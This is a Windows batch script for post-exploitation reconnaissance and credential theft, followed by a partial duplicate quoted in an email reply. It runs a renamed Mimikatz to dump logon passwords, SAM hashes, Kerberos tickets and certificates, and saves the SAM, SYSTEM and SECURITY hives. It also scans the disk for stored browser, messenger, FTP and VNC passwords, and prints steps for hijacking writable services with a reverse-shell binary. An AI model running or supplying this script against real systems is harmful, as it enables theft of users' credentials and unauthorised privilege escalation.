@echo OFF

call:checksysteminfo
call:checknetworkdomain
call:checksystemconfig
call:checkremoteaccess
call:checkautostart
call:checkwmicfu
call:checkunquoted
call:checkregistry
call:checkpasswords
call:findinterestingfiles
call:checkweakpermissions
call:checkOSbit
call:checkdumphashes
call:cleanup
goto END

:checkOSbit
IF DEFINED ProgramFiles(x86) (set OSbit=64) else (set OSbit=32)
goto:eof

:checkdumphashes
echo :------------------
echo :::... Try to dump hashes and logon password ...:::
echo :------------------
echo :
echo :------------------
echo :::... sekurlsa::logonPasswords full ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"

echo :
echo :------------------
echo :::... lsadump::sam ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

echo :
echo :------------------
echo :::... sekurlsa::tickets /export ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"

echo :
echo :------------------
echo :::... crypto::certificates /export (CERT_SYSTEM_STORE_CURRENT_USER) ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_CURRENT_USER /store:my /export" "exit"

echo :
echo :------------------
echo :::... crypto::certificates /export (CERT_SYSTEM_STORE_LOCAL_MACHINE) ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:my /export" "exit"

echo :
echo :------------------
echo :::... crypto::certificates /export (CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE) ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE /store:my /export" "exit"

echo :
echo :------------------
echo :::... crypto::certificates /export (CERT_SYSTEM_STORE_USERS) ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_USERS /store:my /export" "exit"
echo :
echo :------------------
echo :::... End of the hashdump ...:::
echo :------------------
goto:eof

REM Determine the users, environment path, systeminfo, RDP, running process, schedule task, running services
:checksysteminfo
echo :------------------
echo :::... Determine current system information and users ...:::
echo :------------------
echo :
echo :------------------
echo :::... whoami ...:::
echo :------------------
whoami

echo :------------------
echo :::... whoami /all ...:::
echo :------------------
whoami /all 

echo :------------------
echo :::... set ... environment path ...:::
echo :------------------
set 

echo :------------------
echo :::... systeminfo ...:::
echo :------------------
systeminfo


echo :------------------
echo :::... qwinsta ...:::
echo :------------------
qwinsta

echo :------------------
echo :::... qprocess ...:::
echo :------------------
qprocess * 2>&1

echo :------------------
echo :::... tasklist for current process ...:::
echo :------------------
tasklist /FO list /v

echo :------------------
echo :::... schtask for schedule tasks ...:::
echo :------------------
schtasks /query /FO list /v

echo :------------------
echo :::... net start for started services ...:::
echo :------------------
net start 

echo :::... END of checksysteminfo ...:::
echo :
echo :
goto:eof


REM Determine the current network and domain users in the machine
:checknetworkdomain
echo :------------------
echo :::... Check for the current network and domain ...:::
echo :------------------
echo :
echo :------------------
echo :::... ipconfig ...:::
echo :------------------
ipconfig

echo :------------------
echo :::... ipconfig /all ...:::
echo :------------------
ipconfig /all

echo :------------------
echo :::... Display all network, addresses, ports and PID process ...:::
echo :------------------
netstat -ano

echo :------------------
echo :::... Display network route table ...:::
echo :------------------
netstat -r

echo :------------------
echo :::... List all domain users ...:::
echo :------------------
net user /domain

echo :------------------
echo :::... List localgroup administrators ...:::
echo :------------------
net localgroup administrators

echo :------------------
echo :::... List all localgroup domain administrators ...:::
echo :------------------
net localgroup administrators /domain

echo :------------------
echo :::... List domain administrators group ...:::
echo :------------------
net group "Domain Admins" /domain

echo :------------------
echo :::... List enterprise domain administrators group ...:::
echo :------------------
net group "Enterprise Admins" /domain

echo :------------------
echo :::... List domain controllers administrators group ...:::
echo :------------------
net group "Domain Controllers" /domain

echo :------------------
echo :::... List the hostnames of the IP ...:::
echo :------------------
for /F "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do nbtstat -a %%a

echo :------------------
echo :::... Check any sharing on network ...:::
echo :------------------
net share

echo :------------------
echo :::... ARP cache recent connection ...:::
echo :------------------
arp -a

echo :------------------
echo :::... Show the rouing of the current network ...:::
echo :------------------
route print

echo :::... END of checknetworkdomain ...:::
echo :
echo :
goto:eof

REM System configuration such as local group and group policy
:checksystemconfig
echo :------------------
ECHO :::... List system files and program files ...:::
echo :------------------

echo :------------------
echo :::... Export group policy results ...:::
echo :------------------
gpresult /z

echo :------------------
echo :::... Check hosts file ...:::
echo :------------------
type %windir%\system32\drivers\etc\hosts 2>&1

echo :------------------
echo :::... List of folders in program files ...:::
echo :------------------
dir "%programfiles%" 2>&1

echo :------------------
echo :::... List all folders in program files x86 ...:::
echo :------------------
dir "%programfiles(x86)%" 2>&1

REM Finding important files and weak folders permissions
echo :------------------
echo :::... Check important files and weak folders permissions ...:::
echo :------------------

echo :------------------
echo :::... List of logicaldisk in user machine ...:::
echo :------------------
for /f "skip=1 delims=" %%a in ('wmic logicaldisk get caption') do echo %%a

echo :------------------
echo :::... List files in C ...:::
echo :------------------
if exist CdriveTree.txt del CdriveTree.txt
tree C:\ /f /a > CdriveTree.txt

REM Check for any following folders inside
REM	%windir%\repair\sam
REM	%windir%\repair\system
REM	%windir%\repair\software
REM	%windir%\repair\security
REM	%windir%\iis[5,6,7].log
REM	%windir%\system32\logfiles\httperr\httper1.log
REM	$windir%\system32\logfiles\w3svc1\exYYMMDD.log
REM	%windir%\system32\config\AppEvent.Evt
REM	%windir%\system32\config\SecEvent.Evt
REM	%windir%\system32\config\default.sav
REM	%windir%\system32\config\security.sav
REM	%windir%\system32\config\software.sav
REM	%windir%\system32\config\system.sav
REM	%windir%\system32\CCM\logs\*.log


echo :------------------
echo :::... Check for ntuser.dat registry files ...:::
echo :------------------
dir "%userprofile%"

echo :::... END of checksystemconfig ...:::
echo :
echo :
goto:eof

REM Check for remote access 
:checkremoteaccess

echo :------------------
echo :::... Check for remote access available ...:::
echo :------------------
net share 

echo :------------------
echo :::... Show remote task on the computer ...:::
echo :::... ### Caution ### This will remove IPC$ connection ...:::
echo :------------------
REM tasklist /V /S [computername]

REM check for remote access
REM qwinsta /SERVER:computername
REM qprocess /SERVER:computername
REM mstsc /v:SERVER:PORT
REM net use \\computername
REM net use \\computername /user:DOMAINNAME\username password
REM net time \\computername	# show the time of the computername
REM dir \\computername\share

echo :::... END of checkremoteaccess ...:::
echo :
echo :
goto:eof

REM check for auto start dir 
:checkautostart
echo :
echo :------------------
echo :::... Auto start dir ...:::
echo :------------------
echo :::... %systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup ...:::
dir "%systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 2>&1
echo :
echo :
echo :::... %systemdrive%\Documents and Settings\All Users\Start Menu\Programs\StartUp ...:::
dir "%systemdrive%\Documents and Settings\All Users\Start Menu\Programs\StartUp" 2>&1
echo :
echo :
echo :::... %systemdrive%\Windows\Start Menu\Programs\StartUp ...:::
dir "%systemdrive%\Windows\Start Menu\Programs\StartUp" 2>&1
echo :
echo :
echo :::... %systemdrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp ...:::
dir "%systemdrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp" 2>&1
echo :
echo :

echo :::... END of checkautostart ...:::
echo :
echo :
goto:eof

REM WMIC Kung Fu 
:checkwmicfu
if exist wmickungfu.txt del wmickungfu.txt
echo :------------------ >wmickungfu.txt
echo :::... WMIC Kung Fu ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt

echo :------------------ >>wmickungfu.txt
echo :::... BIOS Information ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" bios list full | more 1>nul 2>&1

echo :------------------ >>wmickungfu.txt
echo :::... Windows Hotfix Listing ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" qfe get hotfixid, installedon, installdate, installedby | more 1>nul 2>&1

echo :------------------ >>wmickungfu.txt
echo :::... Windows Startup ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" startup get caption, command, location, user /format:list | more 1>nul 2>&1

echo :------------------ >>wmickungfu.txt
echo :::... Windows Services ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" service get caption, name, servicetype, startmode, state, processid, pathname /format:list | more 1>nul 2>&1

echo :------------------ >>wmickungfu.txt
echo :::... Windows OS Information ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" os get caption, csdversion, csname, osarchitecture, version /format:list | more 1>nul 2>&1

echo :------------------ >>wmickungfu.txt
echo :::... Windows Current Process ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" process get caption, executablepath, commandline, processid /format:list | more 1>nul 2>&1

echo :------------------ >>wmickungfu.txt
echo :::... Windows installed programs ...::: >>wmickungfu.txt
echo :------------------ >>wmickungfu.txt
wmic /append:"wmickungfu.txt" product get caption, installdate, installlocation, packagecache, vendor, version /format:list | more 1>nul 2>&1

echo :::... END of checkwmicfu ...::: >>wmickungfu.txt
echo : >>wmickungfu.txt
echo : >>wmickungfu.txt
goto:eof

REM Check for unquoted service path
:checkunquoted
echo :------------------
echo :::... Windows Service Unquoted Path ...:::
echo :------------------
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v "\""

echo :::... END of checkunquoted ...::: 
echo : 
echo :
goto:eof

REM Registry command (Most of the time require Administrator)
:checkregistry
echo :------------------ 
echo :::... Save registry hive ...::: 
echo :------------------ 

echo :------------------ 
echo :::... Save HKLM Security Hive ...::: 
echo :------------------ 
if exist regsecurity.hive del regsecurity.hive
reg save HKLM\Security regsecurity.hive 2>&1

echo :------------------ 
echo :::... Save HKLM System Hive ...::: 
echo :------------------ 
if exist regsystem.hive del regsystem.hive
reg save HKLM\System regsystem.hive 2>&1

echo :------------------ 
echo :::... Save HKLM SAM Hive ...::: 
echo :------------------ 
if exist regsam.hive del regsam.hive
reg save HKLM\SAM regsam.hive 2>&1

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Find "0x1" 1> NUL
IF %ERRORLEVEL% == 0 (
        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Find "0x1" 1> NUL
        IF %ERRORLEVEL% == 0 (set alwaysinstallelevated=1)
)
reg query "HKCU\SOFTWARE\Microsoft\Protected Storage System Provider" /v "Protected Storage" 1>NUL
IF %ERRORLEVEL% == 0 (set IE6found=1)
reg query "HKCU\SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2" 1>NUL
IF %ERRORLEVEL% == 0 (set IE7found=1)
reg query "HKCU\SOFTWARE\America Online\AIM6\Passwords" 1>NUL
IF %ERRORLEVEL% == 0 (set AIM6found=1)
reg query "HKCU\SOFTWARE\AIM\AIMPRO" 1>NUL
IF %ERRORLEVEL% == 0 (set AIMPROfound=1)
reg query "HKCU\SOFTWARE\Beyluxe Messenger" 1>NUL
IF %ERRORLEVEL% == 0 (set BEYLUXEfound=1)
reg query "HKCU\SOFTWARE\BigAntSoft\BigAntMessenger\Setting" 1>NUL
IF %ERRORLEVEL% == 0 (set BIGANTfound=1)
reg query "HKCU\SOFTWARE\Camfrog\Client" 1>NUL
IF %ERRORLEVEL% == 0 (set CAMFROGfound=1)
reg query "HKCU\SOFTWARE\Google\Google Talk\Accounts" 1>NUL
IF %ERRORLEVEL% == 0 (set GOOGLETALKfound=1)
reg query "HKCU\SOFTWARE\IMVU" 1>NUL
IF %ERRORLEVEL% == 0 (set IMVUfound=1)
reg query "HKCU\SOFTWARE\Nimbuzz\PCClient\Application" 1>NUL
IF %ERRORLEVEL% == 0 (set NIMBUZZfound=1)
reg query "HKCU\SOFTWARE\Paltalk" 1>NUL
IF %ERRORLEVEL% == 0 (set PALTALKfound=1)
reg query "HKCU\SOFTWARE\Yahoo\Pager" 1>NUL
IF %ERRORLEVEL% == 0 (set YAHOOPAGERfound=1)
reg query "HKCU\SOFTWARE\IncrediMail" 1>NUL
IF %ERRORLEVEL% == 0 (set INCREDIMAILfound=1)
reg query "HKCU\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Outlook" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK2013found=1)
reg query "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messenging Subsystem\Profiles" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK2010POSTNTfound=1)
reg query "HKCU\SOFTWARE\Microsoft\Windows Messenging Subsystem\Profiles" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK2010PRENTfound=1)
reg query "HKCU\SOFTWARE\Microsoft\Office\Outlookt\OMI Account Manager\Accounts" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK98MAILONLYfound=1)
reg query "HKCU\SOFTWARE\Microsoft\Internet Account Manager\Accounts" 1>NUL
IF %ERRORLEVEL% == 0 (set OUTLOOK98NORMALfound=1)
reg query "HKCU\SOFTWARE\Adobe\Common\10\Sites" 1>NUL
IF %ERRORLEVEL% == 0 (set DREAMWEAVERfound=1)
reg query "HKCU\SOFTWARE\Google\Google Desktop\Mailboxes\Gmail" 1>NUL
IF %ERRORLEVEL% == 0 (set GMAILDESKTOPfound=1)
reg query "HKCU\SOFTWARE\DownloadManager\Passwords" 1>NUL
IF %ERRORLEVEL% == 0 (set IDMfound=1)
reg query "HKCU\SOFTWARE\Google\Picasa" 1>NUL
IF %ERRORLEVEL% == 0 (set PICASAfound=1)
reg query HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter 1>NUL
IF %ERRORLEVEL% == 0 (set IPRouteEnable=1)
reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set realvncpassfound=1)
reg query HKLM\Software\TightVNC\Server /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set tightvncpassfound1=1)
reg query HKLM\Software\TightVNC\Server /v PasswordViewOnly | Find "PasswordViewOnly" 1> NUL
IF %ERRORLEVEL% == 0 (set tightvncpassfound2=1)
reg query HKLM\Software\TigerVNC\WinVNC4 /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set tigervncpassfound=1)
reg query HKLM\SOFTWARE\ORL\WinVNC3\Default /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set vnc3passfound1=1)
reg query HKLM\SOFTWARE\ORL\WinVNC3 /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set vnc3passfound2=1)
reg query HKCU\Software\ORL\WinVNC3 /v Password | Find "Password" 1> NUL
IF %ERRORLEVEL% == 0 (set vnc3passfound3=1)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword | Find "DefaultPassword" 1> NUL
IF %ERRORLEVEL% == 0 (
        For /F "Tokens=2*" %%a In ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword') Do set defaultloginpass=%%b    
        REM we check if the registry key is not null
        IF NOT [%defaultloginpass%] == [] set winautologinpassfound=1
        set defaultloginpass=
)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUsername | Find "DefaultUsername" 1> NUL
IF %ERRORLEVEL% == 0 (set winautologinuserfound=1)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultDomainname | Find "DefaultDomainname" 1> NUL
IF %ERRORLEVEL% == 0 (set winautologindomainfound=1)

echo :::... END of checkregistry ...::: 
echo : 
echo :
goto:eof

REM Looking for password in all the files (This will take quite long)
REM securityxploded dot com slash passwordsecrets dot php
:checkpasswords
echo :------------------ 
echo :::... Look for passwords ...::: 
echo :------------------ 
findstr /sic:"password=" /sic:"passwd=" /sic:"pass=" /sic:"pwd=" /sic:"secretcode=" /sic:"<password>" *.txt *.xml *.ini C:\\* > foundpass.txt
echo :------------------ 
echo :::... End for look for passwords ...::: 
echo :------------------ 
goto:eof

REM Looking for password in all the files (This will take quite long)
:findinterestingfiles
echo :------------------
echo :::... Interesting files and directories ...:::
echo :------------------
dir C:\* /a/s/b > dirlisting.txt
type dirlisting.txt | findstr /I \.*proof[.]txt$
type dirlisting.txt | findstr /I \.*network-secret[.]txt$
type dirlisting.txt | findstr /I \.*ssh.*[.]ini$
type dirlisting.txt | findstr /I \.*ultravnc[.]ini$
type dirlisting.txt | findstr /I \.*vnc[.]ini$
type dirlisting.txt | findstr /I \.*bthpan[.]sys$
type dirlisting.txt | findstr /I \.*\\repair$
type dirlisting.txt | findstr /I \.*passw*. | findstr /VI \.*.chm$ | findstr /VI \.*.log$ | findstr /VI \.*.dll$ | findstr /VI \.*.exe$
type dirlisting.txt | findstr /I \.*[.]vnc$
type dirlisting.txt | findstr /I \.*groups[.]xml$
type dirlisting.txt | findstr /I \.*printers[.]xml$
type dirlisting.txt | findstr /I \.*drives[.]xml$
type dirlisting.txt | findstr /I \.*scheduledtasks[.]xml$
type dirlisting.txt | findstr /I \.*services[.]xml$
type dirlisting.txt | findstr /I \.*datasources[.]xml$
type dirlisting.txt | findstr /I \.*.rsa.*[.].*$ | findstr /VI \.*.dll$ | findstr /VI \.*.rat$
type dirlisting.txt | findstr /I \.*.dsa.*[.].*$ | findstr /VI \.*.dll$ | findstr /VI \.*.exe$ | findstr /VI \.*.gif$ | findstr /VI \.*.handsafe[.]reg$
type dirlisting.txt | findstr /I \.*[.]dbx$
type dirlisting.txt | findstr /I \.*.account.*.$ | findstr /VI \.*.User.Account.Picture.*. | findstr /VI \.*.bmp$
type dirlisting.txt | findstr /I \.*ntds[.].*$
type dirlisting.txt | findstr /I \.*hiberfil[.].*$
type dirlisting.txt | findstr /I \.*boot[.]ini$
type dirlisting.txt | findstr /I \.*win[.]ini$
type dirlisting.txt | findstr /I \.*.\\config\\RegBack
type dirlisting.txt | findstr /I \.*.\\CCM\\logs
type dirlisting.txt | findstr /I \.*.\\iis.[.]log$
type dirlisting.txt | findstr /I \.*.\\Content.IE.\\index.dat$
type dirlisting.txt | findstr /I \.*.\\inetpub\\logs\\LogFiles
type dirlisting.txt | findstr /I \.*.\\httperr\\httpe.*.[.]log$
type dirlisting.txt | findstr /I \.*.\\logfiles\\w3svc1\\ex.*.[.]log$
type dirlisting.txt | findstr /I \.*.\\Panther\\ | findstr /VI \.*.Resources\\Themes\\.*.
type dirlisting.txt | findstr /I \.*.syspre.*,[.]...$
type dirlisting.txt | findstr /I \.*.unatten.*.[.]txt$
type dirlisting.txt | findstr /I \.*.unatten.*.[.]xml$
type dirlisting.txt | findstr /I \.*Login.Data$
type dirlisting.txt | findstr /I \.*Web.Data$
type dirlisting.txt | findstr /I \.*Credentials.Store$
type dirlisting.txt | findstr /I \.*Credential.Store$
type dirlisting.txt | findstr /I \.*Microsoft\\Credentials.*
REM Avant Browser:
type dirlisting.txt | findstr /I \.*forms[.]dat[.]vdt$
type dirlisting.txt | findstr /I \.*default\\formdata\\forms[.]dat$
REM Comodo Dragon
type dirlisting.txt | findstr /I \.*Dragon\\User.Data\\Default.*
REM CoolNovo
type dirlisting.txt | findstr /I \.*ChromePlus\\User.Data\\Default.*
REM Firefox
type dirlisting.txt | findstr /I \.*Firefox\\Profiles\\.*[.]default$
type dirlisting.txt | findstr /I \.*key3[.]db$
REM Flock Browser
type dirlisting.txt | findstr /I \.*Flock\\User.Data\\Default.*
REM Google Chrome
type dirlisting.txt | findstr /I \.*Chrome\\User.Data\\Default.*
type dirlisting.txt | findstr /I \.*Chrome.SXS\\User.Data\\Default.*
REM Internet Explorer
type dirlisting.txt | findstr /I \.*Microsoft\\Credentials.*
REM Maxthon
type dirlisting.txt | findstr /I \.*MagicFill.*
type dirlisting.txt | findstr /I \.*MagicFill2[.]dat$
REM Opera
type dirlisting.txt | findstr /I \.*Wand[.]dat$
REM Safari
type dirlisting.txt | findstr /I \.*keychain[.]plist$
REM SeaMonkey
type dirlisting.txt | findstr /I \.*signons[.]sqlite$
REM AIM
type dirlisting.txt | findstr /I \.*aimx[.]bin$
REM Digsby
type dirlisting.txt | findstr /I \.*logininfo[.]yaml$
type dirlisting.txt | findstr /I \.*digsby[.]dat$
REM Meebo Notifier
type dirlisting.txt | findstr /I \.*MeeboAccounts[.]txt$
REM Miranda IM
type dirlisting.txt | findstr /I \.*Miranda\\.*[.]dat$
REM MySpace IM
type dirlisting.txt | findstr /I \.*MySpace\\IM\\users[.]txt$
REM Pidgin
type dirlisting.txt | findstr /I \.*Accounts[.]xml$
REM Skype
type dirlisting.txt | findstr /I \.*Skype.*config[.]xml$
REM Tencent QQ
type dirlisting.txt | findstr /I \.*Registry[.]db$
REM Trillian
type dirlisting.txt | findstr /I \.*accounts[.]ini$
REM XFire
type dirlisting.txt | findstr /I \.*XfireUser[.]ini$
REM Foxmail
type dirlisting.txt | findstr /I \.*Account[.]stg$
type dirlisting.txt | findstr /I \.*Accounts[.]tdat$
REM ThunderBird
type dirlisting.txt | findstr /I \.*signons[.]sqlite$
REM Windows Live Mail
type dirlisting.txt | findstr /I \.*[.]oeaccount$
REM FileZilla
type dirlisting.txt | findstr /I \.*recentservers[.]xml$
REM FlashFXP
type dirlisting.txt | findstr /I \.*Sites[.]dat$
REM FTPCommander
type dirlisting.txt | findstr /I \.*Ftplist[.]txt$
REM SmartFTP
type dirlisting.txt | findstr /I \.*SmartFTP.*[.]xml$
REM WS_FTP
type dirlisting.txt | findstr /I \.*ws_ftp[.]ini$
REM Heroes of Newerth
type dirlisting.txt | findstr /I \.*login[.]cfg$
REM JDownloader
type dirlisting.txt | findstr /I \.*JDownloader.*
type dirlisting.txt | findstr /I \.*database[.]script$
type dirlisting.txt | findstr /I \.*accounts[.]ejs$
REM OrbitDownloader
type dirlisting.txt | findstr /I \.*sitelogin[.]dat$
REM Seesmic
type dirlisting.txt | findstr /I \.*data[.]db$
REM SuperPutty
type dirlisting.txt | findstr /I \.*sessions[.]xml$
REM TweetDeck
type dirlisting.txt | findstr /I \.*TweetDeck.*
type dirlisting.txt | findstr /I \.*[.]localstorage$
echo :------------------ 
echo :::... End for Interesting files and directories ...::: 
echo :------------------ 
goto:eof

:checkweakpermissions
echo :-----
echo :::... Searching for weak service permissions (this can take a while) ...:::
echo :------
if exist serviceexes.txt del serviceexes.txt
if exist dirlisting.txt del dirlisting.txt
dir \ /a/s/b > dirlisting.txt
for /f "tokens=1 delims=," %%a in ('tasklist /SVC /FO CSV ^| findstr /I \.*exe*. ^| findstr /VI "smss.exe csrss.exe winlogon.exe services.exe spoolsv.exe explorer.exe ctfmon.exe wmiprvse.exe msmsgs.exe notepad.exe lsass.exe svchost.exe findstr.exe cmd.exe tasklist.exe"') do (findstr %%a$ | findstr /VI "\.*winsxs\\*.") <dirlisting.txt >> serviceexes.txt

for /f "tokens=*" %%a in (serviceexes.txt) do (cacls "%%a"|findstr /I "Users:"|findstr /I "W F") && (echo === !!! Write access to service executable: %%a !!! ===) || (call)
for /f "tokens=*" %%a in (serviceexes.txt) do (cacls "%%a"|findstr /I "Everyone"|findstr /I "W F") && (echo === !!! Write access to service executable: %%a !!! ===) || (call)
 
echo :------------------
echo :::... Files and folder with Read-Write access ...:::
echo :------------------
dir accesschk.exe /a/s/b 1>2>NUL
accesschk.exe /accepteula 1>2>NUL
IF %ERRORLEVEL% == 0 (
        echo === NOTE: accesschk.exe not found, skipping accesschk file permissions checks ===
        goto:eof
)
 
        accesschk.exe /accepteula 1>2>NUL
       
        accesschk.exe -uwqs "Everyone" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*."
        accesschk.exe -uwqs "Users" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*."
        accesschk.exe -uwqs "Authenticated Users" c:\*.*  | findstr /VI \.*System.Volume.Information*. | findstr /VI \.*Documents.And.Settings*.
       
        echo.Searching for weak service permissions
        echo.--------------------------------------
        accesschk.exe -uwcqv "Authenticated Users" * | Find "RW " 1> NUL
        if %ERRORLEVEL% == 0 (
                echo.**** !!! VULNERABLE SERVICES FOUND - Authenticated Users!!! ****
                accesschk.exe -uwcqv "Authenticated Users" *
                echo.****************************************************************
                echo.
        )
        accesschk.exe /accepteula 1>2>NUL
        accesschk.exe -uwcqv "Users" * | Find "RW " 1> NUL
        if %ERRORLEVEL% == 0 (
                echo.**** !!! VULNERABLE SERVICES FOUND - All Users !!! ****
                accesschk.exe -uwcqv "Users" *
                echo.*******************************************************
                echo.To plant binary in service use:
                echo.sc config [service_name] binpath= "C:\rshell.exe"
                echo.sc config [service_name] obj= ".\LocalSystem" password= ""
                echo.sc qc [service_name] (to verify!)
                echo.net start [service_name]
                echo.*******************************************************
        )
        accesschk.exe /accepteula 1>2>NUL
        accesschk.exe -uwcqv "Everyone" * | Find "RW " 1> NUL
        if %ERRORLEVEL% == 0 (
                echo.**** !!! VULNERABLE SERVICES FOUND - Everyone !!! ****
                accesschk.exe -uwcqv "Everyone" *
                echo.*******************************************************
                echo.To plant binary in service use:
                echo.sc config [service_name] binpath= "C:\rshell.exe"
                echo.sc config [service_name] obj= ".\LocalSystem" password= ""
                echo.sc qc [service_name] (to verify!)
                echo.net start [service_name]
                echo.*******************************************************
		)
		
echo :------------------ 
echo :::... End for Files and folder with Read-Write access ...::: 
echo :------------------ 
goto:eof

:cleanup
set accesschk=
set OSbit=
set whoami=
set runningelevatedprompt=
set netshfirewall=
set OSVersion=
set alwaysinstallelevated=
set realvncpassfound=
set tightvncpassfound1=
set tightvncpassfound2=
set tigervncpassfound=
set vnc3passfound1=
set vnc3passfound2=
set vnc3passfound3=
set winautologinpassfound=
set winautologindomainfound=
set winautologinuserfound=
set defaultloginpass=
set IE6found=
set IE7found=
set AIM6found=
set AIMPROfound=
set BEYLUXEfound=
set BIGANTfound=
set CAMFROGfound=
set GOOGLETALKfound=
set IMVUfound=
set NIMBUZZfound=
set PALTALKfound=
set YAHOOPAGERfound=
set INCREDIMAILfound=
set OUTLOOK2013found=
set OUTLOOK2010POSTNTfound=
set OUTLOOK2010PRENTfound=
set OUTLOOK98MAILONLYfound=
set OUTLOOK98NORMALfound=
set IPEnableRouter=
goto:eof

:end
echo :------------------ 
echo :::... DONE! ...::: 
echo :------------------ 
GOTO:eof














On Wed, Feb 22, 2017 at 8:53 AM, 冰冰 <kyletella2@gmail.com> wrote:
@echo OFF

call:checksysteminfo
call:checknetworkdomain
call:checksystemconfig
call:checkremoteaccess
call:checkautostart
call:checkwmicfu
call:checkunquoted
call:checkregistry
call:checkpasswords
call:findinterestingfiles
call:checkweakpermissions
call:cleanup
goto END
REM call:credits
REM call:checkOSbit
REM 
REM goto end
REM 
REM :credits
REM REM 
REM echo Nobody
REM goto:eof
REM 
REM :checkOSbit
REM IF DEFINED ProgramFiles(x86) (set OSbit=64) else (set OSbit=32)
REM goto:eof
REM 
REM :unquotedservicepath
REM wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
REM 
REM 
REM for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> permissions.txt
REM for /f eol^=^"^ delims^=^" %a in (permissions.txt) do cmd.exe /c icacls "%a"



REM Determine the users, environment path, systeminfo, RDP, running process, schedule task, running services
:checksysteminfo
echo :------------------
echo :::... Determine current system information and users ...:::
echo :------------------
echo :
echo :------------------
echo :::... whoami ...:::
echo :------------------
whoami

echo :------------------
echo :::... whoami /all ...:::
echo :------------------
whoami /all 

echo :------------------
echo :::... set ... environment path ...:::
echo :------------------
set 

echo :------------------
echo :::... systeminfo ...:::
echo :------------------
systeminfo

echo :------------------
echo :::... qwinsta ...:::
echo :------------------
qwinsta

echo :------------------
echo :::... qprocess ...:::
echo :------------------
qprocess * 2>&1

echo :------------------
echo :::... tasklist for current process ...:::
echo :------------------
tasklist /FO list /v

echo :------------------
echo :::... schtask for schedule tasks ...:::
echo :------------------
schtasks /query /FO list /v

echo :------------------
echo :::... net start for started services ...:::
echo :------------------
net start 

echo :::... END of checksysteminfo ...:::
echo :
echo :
goto:eof


REM Determine the current network and domain users in the machine
:checknetworkdomain
echo :------------------
echo :::... Check for the current network and domain ...:::
echo :------------------
echo :
echo :------------------
echo :::... ipconfig ...:::
echo :------------------
ipconfig

echo :------------------
echo :::... ipconfig /all ...:::
echo :------------------
ipconfig /all

echo :------------------
echo :::... Display all network, addresses, ports and PID process ...:::
echo :------------------
netstat -ano

echo :------------------
echo :::... Display network route table ...:::
echo :------------------
netstat -r

echo :------------------
echo :::... List all domain users ...:::
echo :------------------
net user /domain

echo :------------------
